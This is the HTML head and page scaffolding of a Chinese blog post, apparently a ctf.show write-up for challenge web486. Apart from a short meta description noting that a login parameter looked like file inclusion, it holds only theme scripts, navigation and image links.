<!DOCTYPE html>

<head>
	
	<title>中期测评 - wanan</title>
	<meta charset="utf-8">
	
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
	
	<meta name="description" content="web486打开是一个登录   翻一下源码,没发现什么  注册之后登录也没有反应,重点并不是在这里  发现地址有一个login,感觉像是文件包含  尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试 index.php  &lt;?php  &#x2F;* # -*- coding: utf-8 -*-  Author: h1xa  Date:">
<meta property="og:type" content="article">
<meta property="og:title" content="中期测评">
<meta property="og:url" content="https://lovewanan.github.io/ctfshow/ctf.show/%E4%B8%AD%E6%9C%9F%E6%B5%8B%E8%AF%84/index.html">
<meta property="og:site_name" content="wanan">
<meta property="og:description" content="web486打开是一个登录   翻一下源码,没发现什么  注册之后登录也没有反应,重点并不是在这里  发现地址有一个login,感觉像是文件包含  尝试包含index.php发现出错,并且看到有一个templates目录, 还有render我们回到html试试 index.php  &lt;?php  &#x2F;* # -*- coding: utf-8 -*-  Author: h1xa  Date:">
<meta property="og:locale">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191856556.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191923770.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191952963.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192022882.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192056235.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192221515.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192329514.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410192407141.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410204859844.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205121149.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205138507.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410205240261.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221106580.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410221119368.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102110451.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102318520.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102428030.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102622460.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411102822927.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103133848.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103218434.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103521026.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103553676.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103632717.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103705971.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103726475.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103744290.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411103838783.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104009891.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104056974.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104157508.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104302975.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104517364.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104626210.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411104643730.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125917354.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411125924937.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130153307.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130313269.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411130349070.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140331722.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140305568.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140520958.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411140614700.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200031843.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200106381.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200118887.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200135182.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411200208135.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201037379.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201043845.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411201050704.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215049150.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411215056027.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223652378.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220411223730608.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182606641.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182616097.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413182939258.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413183106690.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201803657.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413201900968.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203537687.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413203611392.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413204553495.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205251454.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205320503.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413205531082.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210540856.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413210943926.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212004560.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212112902.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212450700.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413212901748.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215811269.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413215857742.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220821778.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413220833082.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221724286.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413221731992.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413222608356.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223842488.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413223917170.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224734911.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220413224744176.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414104704841.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105156834.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105404649.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105530888.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105605711.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105811237.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414105901789.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112216286.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414112259433.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414113103225.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121330746.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414121359533.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414122321538.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123323733.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414123406853.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414124910368.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125413444.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414125540070.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130230633.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130410885.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414130450436.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131751499.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414131808105.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414132009224.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133327832.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133433745.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133503550.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414133936922.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134023254.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414134049496.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414135942222.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140114969.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414140311853.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141131861.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141636372.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141707910.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141804254.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414141747100.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145931393.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414150059799.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145937985.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414145955200.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414190915815.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163202241.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155052515.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414155109466.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163241108.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163406655.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414163441821.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414175947530.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180031940.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180041275.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180054215.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414180124402.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181027066.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414181233123.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182124982.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183409943.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414182908939.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183420553.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414183454050.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414184559957.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185417494.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185459158.png">
<meta property="og:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220414185522037.png">
<meta property="article:published_time" content="2022-04-17T14:37:17.287Z">
<meta property="article:modified_time" content="2022-04-18T07:29:19.521Z">
<meta property="article:author" content="wanan">
<meta property="article:tag" content="ctf.show">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220410191856556.png">

	<meta name="theme-color" content="#5e72e4">
	<meta name="theme-color-rgb" content="94,114,228">
	<meta name="theme-color-origin" content="#5e72e4">
	<meta name="argon-enable-custom-theme-color" content="true">
	<meta name="theme-card-radius" content="4">
	<meta name="theme-version" content="1.0.2">
	<link rel="icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">
	<link rel="shortcut icon" href="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/wanan.ico" type="image/x-icon">

	
<link rel="stylesheet" href="/assets/argon_css_merged.css">

	
<link rel="stylesheet" href="/style.css">

	
<link rel="stylesheet" href="//fonts.loli.net/css?family=Open+Sans:300,400,600,700|Noto+Serif+SC:300,600&display=swap.css">

	
<script src="/assets/argon_js_merged.js"></script>

	
<script src="/assets/js/argon.min.js"></script>

	
<script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>


	

	<script>
		var argonConfig = {
			language: "zh_CN",
			
				zoomify: {
					duration: 200,
					easing: "cubic-bezier(0.4,0,0,1)",
					scale: 0.9
				},
			
			pangu: "false",
			
				lazyload: {
					threshold: 800,
					effect: "fadeIn"
				},
			
			disable_pjax: false,
			headroom: false
		}
	</script>
	<script>
		var darkmodeAutoSwitch = "false";
		function setDarkmode(enable){
			if (enable == true){
				$("html").addClass("darkmode");
			}else{
				$("html").removeClass("darkmode");
			}
			$(window).trigger("scroll");
		}
		function toggleDarkmode(){
			if ($("html").hasClass("darkmode")){
				setDarkmode(false);
				sessionStorage.setItem("Argon_Enable_Dark_Mode", "false");
			}else{
				setDarkmode(true);
				sessionStorage.setItem("Argon_Enable_Dark_Mode", "true");
			}
		}
		if (sessionStorage.getItem("Argon_Enable_Dark_Mode") == "true"){
			setDarkmode(true);
		}
		function toggleDarkmodeByPrefersColorScheme(media){
			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
				return;
			}
			if (media.matches){
				setDarkmode(true);
			}else{
				setDarkmode(false);
			}
		}
		function toggleDarkmodeByTime(){
			if (sessionStorage.getItem('Argon_Enable_Dark_Mode') == "false" || sessionStorage.getItem('Argon_Enable_Dark_Mode') == "true"){
				return;
			}
			let hour = new Date().getHours();
			if (hour < 7 || hour >= 22){
				setDarkmode(true);
			}else{
				setDarkmode(false);
			}
		}
		if (darkmodeAutoSwitch == 'system'){
			var darkmodeMediaQuery = window.matchMedia("(prefers-color-scheme: dark)");
			darkmodeMediaQuery.addListener(toggleDarkmodeByPrefersColorScheme);
			toggleDarkmodeByPrefersColorScheme(darkmodeMediaQuery);
		}
		if (darkmodeAutoSwitch == 'time'){
			toggleDarkmodeByTime();
		}
		if (darkmodeAutoSwitch == 'alwayson'){
			setDarkmode(true);
		}

		function toggleAmoledDarkMode(){
			$("html").toggleClass("amoled-dark");
			if ($("html").hasClass("amoled-dark")){
				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "true");
			}else{
				localStorage.setItem("Argon_Enable_Amoled_Dark_Mode", "false");
			}
		}
		if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "true"){
			$("html").addClass("amoled-dark");
		}else if (localStorage.getItem("Argon_Enable_Amoled_Dark_Mode") == "false"){
			$("html").removeClass("amoled-dark");
		}
	</script>
	<script>
		if (navigator.userAgent.indexOf("Safari") !== -1 && navigator.userAgent.indexOf("Chrome") === -1){
			$("html").addClass("using-safari");
		}
	</script>

	
		
<script src="/assets/vendor/smoothscroll/smoothscroll1.js"></script>

	
<meta name="generator" content="Hexo 6.0.0"></head>



<style id="themecolor_css">
	
	:root{
		--themecolor: #5e72e4;
		--themecolor-dark0: #5368E2;
		--themecolor-dark: #485FE0;
		--themecolor-dark2: #324CDD;
		--themecolor-dark3: #233DD2;
		--themecolor-light: #8A98EB;
		--themecolor-rgbstr: 94,114,228;
		--themecolor-gradient: linear-gradient(150deg,var(--themecolor-light) 15%, var(--themecolor) 70%, var(--themecolor-dark0) 94%);

	}
</style>
<style id="theme_cardradius_css">
	:root{
		--card-radius: 4px;
	}
</style>

<body>
<div id="toolbar">
	<header class="header-global">
		<nav id="navbar-main" class="navbar navbar-main navbar-expand-lg navbar-transparent navbar-light bg-primary headroom--not-bottom headroom--not-top headroom--pinned">
			<div class="container">
				
				<button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
					<span class="navbar-toggler-icon"></span>
				</button>
				<a class="navbar-brand" href="/">wanan</a>
				<div class="navbar-collapse collapse" id="navbar_global">
					<div class="navbar-collapse-header">
						<div class="row">
							<div class="col-6 collapse-brand"></div>
							<div class="col-6 collapse-close">
								<button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar_global" aria-controls="navbar_global" aria-expanded="false" aria-label="Toggle navigation">
									<span></span>
									<span></span>
								</button>
							</div>
						</div>
					</div>
					<ul id="navbar_search_btn_mobile" class="navbar-nav align-items-lg-center ml-lg-auto">
						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" style="padding-left: 5px;">
							<a class="nav-link nav-link-icon">
								<i class="fa fa-search"></i>
								<span class="nav-link-inner--text d-lg-none">搜索</span>
							</a>
						</li>
					</ul>
					
							<ul class='navbar-nav navbar-nav-hover align-items-lg-center'>
								
										<li class='nav-item'>
											<a href='/' class='nav-link' >
												<i class='ni ni-book-bookmark d-lg-none'></i>
												<span class='nav-link-inner--text'>首页</span>
											</a>
											
										</li>
									
										<li class='nav-item dropdown'>
											<a href='' class='nav-link' onclick='return false;' data-toggle='dropdown' no-pjax>
												<i class='ni ni-book-bookmark d-lg-none'></i>
												<span class='nav-link-inner--text'>分类</span>
											</a>
											
													<div class="dropdown-menu">
														
															<a href='/categories/ctf/' class='dropdown-item'>ctf</a>
														
															<a href='/categories/ctf/sql%E6%B3%A8%E5%85%A5/' class='dropdown-item'>sql注入</a>
														
															<a href='/categories/java%E7%9F%A5%E8%AF%86/' class='dropdown-item'>java知识</a>
														
															<a href='/categories/ctf/php%E7%9F%A5%E8%AF%86' class='dropdown-item'>php知识</a>
														
															<a href='/categories/BUUCTF' class='dropdown-item'>BUUCTF</a>
														
															<a href='/categories/Linux' class='dropdown-item'>Linux</a>
														
															<a href='/categories/ctfshow' class='dropdown-item'>ctf.show</a>
														
													</div>
												
										</li>
									
							</ul>
						
					<ul class="navbar-nav align-items-lg-center ml-lg-auto">
						<li class="nav-item" data-toggle="modal" data-target="#argon_search_modal" id="navbar_search_btn_pc">
							<a class="nav-link nav-link-icon">
								<i class="fa fa-search"></i>
								<span class="nav-link-inner--text d-lg-none">搜索</span>
							</a>
						</li>
					</ul>
				</div>
				
				<div id="navbar_menu_mask" data-toggle="collapse" data-target="#navbar_global"></div>
			</div>
		</nav>
	</header>
</div>
<div class="modal fade" id="argon_search_modal" tabindex="-1" role="dialog" aria-labelledby="" aria-hidden="true">
	<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
		<div class="modal-content">
			<div class="modal-header">
				<h5 class="modal-title">搜索</h5>
				<button type="button" class="close" data-dismiss="modal" aria-label="Close">
					<span aria-hidden="true">&times;</span>
				</button>
			</div>
			<div class="modal-body">
				<!-- TODO -->
<div class="form-group mb-3">
	<div class="input-group input-group-alternative">
		<div class="input-group-prepend">
			<span class="input-group-text"><i class="fa fa-search"></i></span>
		</div>
		<input id="local-search-input" class="form-control" placeholder="搜索什么..." type="text"  autocomplete="off" data-search.path="search.xml" data-config.root="/">
	</div>
	<div id="local-search-result"></div>
</div>

			</div>
		</div>
	</div>
</div>
<!--Banner-->
<section id="banner" class="banner section section-lg section-shaped">
	<div class="shape shape-style-1 shape-primary">
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
		<span></span>
	</div>

	
	<div id="banner_container" class="banner-container container text-center">
		
			<div class="banner-title text-white"><span class="banner-title-inner">wanan</span>
		
		</div>
	</div>
	
		<style>
			section.banner{
				background-image: url(/assets/img/banner.jpg) !important;
			}
		</style>
	
</section>


	<style>
		#content:before {
			content: '';
			display: block;
			position: fixed;
			left: 0;
			right: 0;
			top: 0;
			bottom: 0;
			z-index: -2;
			background: url(/assets/img/banner.jpg);
			background-position: center;
			background-size: cover;
			background-repeat: no-repeat;
			opacity: 1;
			transition: opacity .5s ease;
		}
		html.darkmode #content:before{
			filter: brightness(0.65);
		}
		
			#content:after {
				content: '';
				display: block;
				position: fixed;
				left: 0;
				right: 0;
				top: 0;
				bottom: 0;
				z-index: -2;
				background: url(/assets/img/banner.jpg);
				background-position: center;
				background-size: cover;
				background-repeat: no-repeat;
				opacity: 0;
				transition: opacity .5s ease;
			}
			html.darkmode #content:after {
				opacity: 1;
			}
			html.darkmode #content:before {
				opacity: 0;
			}
		
		
			#banner, #banner .shape {
				background: transparent !important;
			}
		
	</style>




<div id="float_action_buttons" class="float-action-buttons fabtns-unloaded">
	<button id="fabtn_toggle_sides" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-hidden="true" tooltip-move-to-left="移至左侧" tooltip-move-to-right="移至右侧">
		<span class="btn-inner--icon fabtn-show-on-right"><i class="fa fa-caret-left"></i></span>
		<span class="btn-inner--icon fabtn-show-on-left"><i class="fa fa-caret-right"></i></span>
	</button>
	<button id="fabtn_back_to_top" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" aria-label="Back To Top" tooltip="回到顶部">
		<span class="btn-inner--icon"><i class="fa fa-angle-up"></i></span>
	</button>
	<button id="fabtn_go_to_comment" class="btn btn-icon btn-neutral fabtn shadow-sm d-none" type="button" <-% theme.fab_show_gotocomment_button ? "" : "style='display: none;'"  aria-label="Comment" tooltip="评论">
		<span class="btn-inner--icon"><i class="fa fa-comment-o"></i></span>
	</button>
	<button id="fabtn_toggle_darkmode" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_darkmode_button ? "" : "style='display: none;'"  aria-label="Toggle Darkmode" tooltip-darkmode="夜间模式" tooltip-blackmode="暗黑模式" tooltip-lightmode="日间模式">
		<span class="btn-inner--icon"><i class="fa fa-moon-o"></i><i class='fa fa-lightbulb-o'></i></span>
	</button>
	<button id="fabtn_toggle_blog_settings_popup" class="btn btn-icon btn-neutral fabtn shadow-sm" type="button" <-% theme.fab_show_settings_button ? "" : "style='display: none;'"  aria-label="Open Blog Settings Menu" tooltip="设置">
		<span class="btn-inner--icon"><i class="fa fa-cog"></i></span>
	</button>
	<div id="fabtn_blog_settings_popup" class="card shadow-sm" style="opacity: 0;" aria-hidden="true">
		<div id="close_blog_settings"><i class="fa fa-close"></i></div>
		<div class="blog-setting-item mt-3">
			<div style="transform: translateY(-4px);"><div id="blog_setting_toggle_darkmode_and_amoledarkmode" tooltip-switch-to-darkmode="切换到夜间模式" tooltip-switch-to-blackmode="切换到暗黑模式"><span>夜间模式</span><span>暗黑模式</span></div></div>
			<div style="flex: 1;"></div>
			<label id="blog_setting_darkmode_switch" class="custom-toggle">
				<span class="custom-toggle-slider rounded-circle"></span>
			</label>
		</div>
		<div class="blog-setting-item mt-3">
			<div style="flex: 1;">字体</div>
			<div>
				<button id="blog_setting_font_sans_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-left">Sans Serif</button><button id="blog_setting_font_serif" type="button" class="blog-setting-font btn btn-outline-primary blog-setting-selector-right">Serif</button>
			</div>
		</div>
		<div class="blog-setting-item mt-3">
			<div style="flex: 1;">阴影</div>
			<div>
				<button id="blog_setting_shadow_small" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-left">浅阴影</button><button id="blog_setting_shadow_big" type="button" class="blog-setting-shadow btn btn-outline-primary blog-setting-selector-right">深阴影</button>
			</div>
		</div>
		<div class="blog-setting-item mt-3 mb-3">
			<div style="flex: 1;">滤镜</div>
			<div id="blog_setting_filters" class="ml-3">
				<button id="blog_setting_filter_off" type="button" class="blog-setting-filter-btn ml-0" filter-name="off">关闭</button>
				<button id="blog_setting_filter_sunset" type="button" class="blog-setting-filter-btn" filter-name="sunset">日落</button>
				<button id="blog_setting_filter_darkness" type="button" class="blog-setting-filter-btn" filter-name="darkness">暗化</button>
				<button id="blog_setting_filter_grayscale" type="button" class="blog-setting-filter-btn" filter-name="grayscale">灰度</button>
			</div>
		</div>
		<div class="blog-setting-item mb-3">
			<div id="blog_setting_card_radius_to_default" style="cursor: pointer;" tooltip="恢复默认">圆角</div>
			<div style="flex: 1;margin-left: 20px;margin-right: 8px;transform: translateY(2px);">
				<div id="blog_setting_card_radius"></div>
			</div>
		</div>
		
			<div class="blog-setting-item mt-1 mb-3">
				<div style="flex: 1;">主题色</div>
				<div id="theme-color-picker" class="ml-3"></div>
			</div>
		
	</div>
